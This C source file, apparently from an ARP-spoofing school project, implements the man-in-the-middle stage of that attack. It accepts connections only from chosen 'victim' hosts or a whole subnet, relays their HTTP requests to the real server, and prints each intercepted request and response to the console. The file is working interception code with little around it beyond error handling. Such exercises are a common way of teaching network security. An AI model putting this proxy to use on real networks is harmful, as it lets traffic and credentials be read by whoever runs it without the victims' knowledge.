#include "ft_malcom.h"

int create_listen_socket() {
	int 				listen_sock;
	struct sockaddr_in	addr;

	if ((listen_sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		perror("socket");
		return -1;
	}

	addr.sin_family = AF_INET;
	addr.sin_port = htons(4242);
	addr.sin_addr.s_addr = INADDR_ANY;

	if (bind(listen_sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
		perror("bind");
		return -1;
	}

	if (listen(listen_sock, 10) < 0) {
		perror("listen");
		return -1;
	}
	return listen_sock;
}

int	handle_victim_connections(int listen_sock) {
	struct sockaddr_in	victim_addr;
	socklen_t			victim_addr_len;
	int					victim_sock = -1;

	victim_addr_len = sizeof(victim_addr);

	while (true) {
		close(victim_sock);
		if ((victim_sock = accept(listen_sock, (struct sockaddr*)&victim_addr, &victim_addr_len)) < 0) {
			perror("accept");
			return -1;
		}

		// Check if the connected client is one of the victims.
		if (args.attack_type == INTERFACE_WIDE_SPOOFING) {
			uint8_t victim_ip[IPV4_ADDR_LEN];
			memcpy(victim_ip, &victim_addr.sin_addr.s_addr, sizeof(victim_ip));
			if (!in_same_network(victim_ip, args.src_ip, args.if_netmask, IPV4_ADDR_LEN))
				continue;
			break ;
		} else if (memcmp(&victim_addr.sin_addr.s_addr, args.tar_ip, sizeof(victim_addr.sin_addr.s_addr)) == 0)
			break ;
	}

	verbose_log("Victim connected to the proxy!\n");
	verbose_log("Victim IP: %s\n", inet_ntoa(victim_addr.sin_addr));

	return victim_sock;
}

int	connect_to_server() {
	int					server_sock;
	struct sockaddr_in	server_addr;

	if ((server_sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		perror("socket");
		return -1;
	}

	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(4242);
	memcpy(&server_addr.sin_addr.s_addr, args.src_ip, sizeof(server_addr.sin_addr.s_addr));

	if (connect(server_sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
		perror("connect");
		return -1;
	}
	
	verbose_log("Connected to the server!\n");
	return server_sock;
}

int	proxy_http() {
	int listen_sock = -1, victim_sock = -1, server_sock = -1;

	if ((listen_sock = create_listen_socket()) < 0) {
		fprintf(stderr, "Failed to create listen socket\n");
		goto erro;
	}

	if ((victim_sock = handle_victim_connections(listen_sock)) < 0) {
		fprintf(stderr, "Failed to handle victim connections\n");
		goto erro;
	}

	if ((server_sock = connect_to_server()) < 0) {
		fprintf(stderr, "Failed to connect to server\n");
		goto erro;
	}

	// Read the HTTP request from the victim and forward it to the server
	char buffer[4096];
	ssize_t bytes_read;

	bzero(buffer, sizeof(buffer));

	bytes_read = recv(victim_sock, buffer, sizeof(buffer) - 1, 0);
	if (bytes_read < 0) {
		perror("recv");
		goto erro;
	}

	verbose_log("Received HTTP request from victim:\n\n");

	printf("----------------REQUEST----------------\n");
	write(1, buffer, bytes_read);
	printf("--------------------END----------------\n\n");


	if (send(server_sock, buffer, bytes_read, 0) < 0) {
		perror("send");
		goto erro;
	}

	bzero(buffer, sizeof(buffer));

	// Read the HTTP response from the server and forward it to the victim
	bytes_read = recv(server_sock, buffer, sizeof(buffer) - 1, 0);
	if (bytes_read < 0) {
		perror("recv");
		goto erro;
	}

	verbose_log("Received HTTP response from server:\n\n");

	printf("----------------RESPONSE-----------------\n");
	write(1, buffer, bytes_read);
	printf("--------------------END----------------\n\n");

	if (send(victim_sock, buffer, bytes_read, 0) < 0) {
		perror("send");
		goto erro;
	}

	return 0;

erro :
	close(listen_sock);
	close(victim_sock);
	close(server_sock);
	return (-1);
}